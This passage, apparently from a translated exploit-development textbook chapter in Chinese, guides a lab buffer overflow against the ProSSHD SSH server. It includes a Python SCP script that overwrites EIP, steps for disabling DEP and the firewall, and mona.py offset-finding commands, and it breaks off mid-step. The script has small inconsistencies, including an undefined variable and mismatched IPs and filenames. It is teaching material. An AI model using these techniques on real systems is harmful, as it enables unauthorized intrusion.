
![](img/0add480ffb73b6bc89b65d99f7d6b37a_457_1.png)

**注意** 如果你的目标虚拟机在所有程序和服务上都运行了数据执行防止 (DEP)，你暂时需要为 ProSSHD 设置异常。最快的方法是按住 Windows 键并按下键盘上的 BREAK 键调出系统控制面板。在控制面板左侧，点击“高级系统设置”。在弹出窗口中，点击“性能”区域的“设置”。点击右侧标题为“数据执行防止”的选项卡。如果选择了“为我选择的所有程序和服务之外的项目启用 DEP”，则你需要为 `wssshd.exe` 和 `xwpshd.exe` 程序添加异常。只需点击“添加”，从 ProSSHD 文件夹中选择这两个 EXE 文件，即可完成！

现在 SSH 服务器正在运行，你需要确定系统的 IP 地址，并使用 SSH 客户端从你的 Kali Linux 机器连接它。在我们的案例中，运行 ProSSHD 的虚拟机位于 `192.168.209.199`。你需要通过管理员命令行提示符使用命令 `Netsh advfirewall allprofiles state off` 来关闭 Windows 防火墙，或者简单地添加规则允许 SSH 的 TCP 端口 22 入站。

此时，存在漏洞的应用程序和调试器已运行在漏洞服务器上，但它们尚未挂载（attach），因此建议通过创建快照来保存 VMware 虚拟机的状态。快照完成后，你可以通过还原快照回到此点。这个技巧将为你节省宝贵的测试时间，因为在后续的迭代测试中你可以跳过所有之前的设置和重启。

# 控制指令指针

在你的 Kali Linux 虚拟机中打开你喜欢的编辑器并创建以下脚本，将其保存为 `prosshd1.py`，以验证服务器的漏洞：

![](img/0add480ffb73b6bc89b65d99f7d6b37a_458_0.png)

注意：此脚本需要 `paramiko` 和 `scp` 模块。`paramiko` 模块应该已经安装了，但你需要核实你的 Kali 版本是否包含 `scp`。如果你尝试运行以下脚本并遇到关于 `scp` 的错误，则你需要通过运行 `pip3 install scp` 来下载并安装 `scp` 模块。你还需要在 Kali Linux 的命令行 shell 中使用默认 SSH 客户端连接一次，以便漏洞目标服务器出现在已知的 SSH 主机列表中。你需要在运行 ProSSH 的目标 Windows 虚拟机上创建一个用户账户，你将在漏洞利用程序（exploit）中使用该账户。我们正在使用的用户名为 `test1`，密码为 `asdf`。创建该账户或类似的账户并用于本实验。

```python
#prossshd1.py
# Based on original Exploit by S2 Crew [Hungary]
import paramiko
from scp import SCPClient
from contextlib import closing
from time import sleep
import struct

hostname = "192.168.209.198"
username = "test1"
password = "asdf"
req = "A" * 500

ssh_client = paramiko.SSHClient()
ssh_client.load_system_host_keys()
ssh_client.connect(hostname, username=username, key_filename=None, password=password)
sleep(15)

with SCPClient(ssh_client.get_transport()) as scp:
    scp.put(sc, req)
```

此脚本将从你的攻击主机运行，并指向目标（运行在 VMware 中）。

![](img/0add480ffb73b6bc89b65d99f7d6b37a_459_0.png)

注意：记得更改 IP 地址以匹配你的漏洞服务器，并核实你已经在 Windows VM 上创建了 `test1` 用户账户。

事实证明漏洞存在于子进程 `wsshd.exe` 中，该进程仅在与服务器有活动连接时才存在。因此，我们需要启动漏洞利用程序并迅速挂载调试器以继续分析。这就是为什么 `sleep()` 函数使用了 15 秒的参数，为我们留出挂载时间。在 VMware 虚拟机内部，你可以通过选择 File（文件） | Attach（挂载）将调试器挂载到漏洞程序。选择 `wsshd.exe` 进程并点击 Attach 按钮启动调试器。

![](img/0add480ffb73b6bc89b65d99f7d6b37a_460_0.png)

注意：通过 Name（名称）列对 Attach 界面进行排序可能有助于快速找到进程。如果需要时间挂载，可以增加传递给 `sleep()` 函数的秒数。开始！从 Kali 启动攻击脚本，然后快速切换到 VMware 目标并挂载调试器到 `wsshd.exe`。

| PID | Name | Session ID | Window | Path |
| :--- | :--- | :--- | :--- | :--- |
| 1016 | wsshd | | USA32-4000 | C:\Users\ |
| 1640 | xwpsetts | | Settings (days eval) | C:\Users\ |
| 2288 | notepad | | Untitled | C:\Python27 |
| 2284 | xwpshd | | wsshd.exe -Run | C:\Users\ |
| 2508 | Dump | | Notification Window | C:\Windows\ |
| 2536 | Dash | | handling window | C:\Windows\ |
| 2544 | Explorer | | Start | C:\Windows\ |
| 2748 | VMware | | Default | C:\Program\ |
| 2760 | Notepad | | ControlTitle | C:\Program\ |
| 2872 | dllhost | | AutoWindow | C:\Windows\ |
| 2992 | TPAutoConnect | | Python Shell | C:\Windows\ |
| 3000 | conhost | | | \Python27 |

一旦调试器启动并加载进程，按下 F9 继续。此时漏洞利用应该已经送达，调试器的右下角应变为黄色并显示“Paused（暂停）”。根据你使用的 Windows 版本，调试器可能要求你在第一次暂停后按下 F9。如果没有在 EIP 寄存器中看到 `0x4141`（如下所示），请再次按下 F9。将攻击窗口放在某个位置通常有助于在调试器暂停时看到右下角。

```
EBX 0000001C
ESP 0012F3A8 "AAAAAA/foo.txt"
EIP 0012F3A4
ESI 76A635B kernel32.CreatePipe
EDI 0012F3A0 Access violation when executing [4141]
```

我们可以看到我们控制了 EIP，现在持有 4141。

# 确定 Offset

接下来你将使用 Corelan Team 的 `mona.py` 插件生成模式来确定控制的字节数。要获取 `mona.py`，请访问 https://github.com/corelan/mona 并下载工具的最新版本。将其保存到 Immunity Debugger 文件夹下的 Plugins 目录。我们将使用移植到 Metasploit 的脚本。我们首先想要设置 Mona 输出的工作目录。因此，启动 Immunity Debugger 实例。此时无需加载程序。点击调试器窗口底部的 Python 命令行 shell，输入命令：

`mona config -set workingfolder c:\grayhat\mona_logs\`

如果 Immunity Debugger 跳到日志窗口，只需点击栏上的“c”按钮返回主 CPU 窗口。我们现在必须为脚本生成一个 500 字节的模式。在 Immunity Debugger Python 命令行 shell 中输入：

`mona pc 500`

这将生成一个 500 字节的模式，并存储在 `C:\grayhat\mona_logs\` 下名为 `wsshd` 的新文件夹中。在该目录下应该有一个名为 `pattern.txt` 的新文件。这就是你要复制生成模式的地方。正如 Mona 所示，不要从调试器的日志窗口复制模式，因为可能会被截断。

在你的 Kali Linux 虚拟机上保存一份 `sshd1.py` 攻击脚本的新副本（此示例使用名称 `sshd2.py`）。从 `pattern.txt` 文件复制 ASCII 模式并修改 `req` 行包含它，如下：
